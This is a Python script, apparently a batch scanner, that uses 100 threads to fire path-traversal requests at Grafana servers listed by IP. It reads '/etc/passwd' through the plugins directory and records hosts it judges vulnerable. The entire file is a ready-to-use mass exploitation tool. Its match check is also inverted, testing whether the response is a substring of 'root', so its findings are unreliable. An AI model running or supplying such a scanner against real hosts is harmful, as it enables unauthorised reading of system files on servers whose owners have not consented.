# -*- encoding: utf-8 -*-
# Time : 2021/12/07 23:05:31
# Author: crow
# Grafana plugins 任意文件读取批量检测脚本
# poc参考：https://github.com/ScorpionsMAX/Grafana-loophole


import requests
import threading
from queue import Queue


class Check_ips(threading.Thread):
    def __init__(self, queue, file_path):
        threading.Thread.__init__(self)
        self._queue = queue
        self._file_path = file_path
        

    def run(self):
        while not self._queue.empty():
            Ip = self._queue.get()
            file_path_ = self._file_path
            try:
                self.check(Ip, file_path_)
            except Exception as e:
                # print(e)
                pass

    def check(self, ip, file_path_):
        f = open("./paload.txt")
        print('正在测试ip:',ip)
        for line in f:
            url = "http://"+ ip +"/public/plugins/"+str.rstrip(line)+"/../../../../../../../../../../../etc/passwd"
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
            }
            req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False)
            a=req.text
            # print('当前a的值:',a)
            str1='root'
            if a in str1:
                print('确认存在'+str.rstrip(line)+'路径,并存在漏洞!')
                print(url)
                with open('Grafana 8.x_vuln.txt', 'a+') as ff:
                    ff.write(url + '\n')
            else:
                pass
                # print('不存在漏洞!')
                


def check_ip(file_path):
    queue = Queue()
    with open(file_path, 'r') as f:
        for line in f.readlines():
        # print(line[:-1])
            ip = line[:-1]
            # print('正在测试ip:',ip)       
            queue.put(ip)
        print('[+] Loading complite')
        threads = []
        thread_counts = 100  # 定义线程
        for i in range(thread_counts):
            threads.append(Check_ips(queue, file_path))
        for t in threads:
            t.start()
        for t in threads:
            t.join()



if __name__ == "__main__":   
    file_path = 'Grafana_3000.txt'
    check_ip(file_path)
    print('[+] check complete')
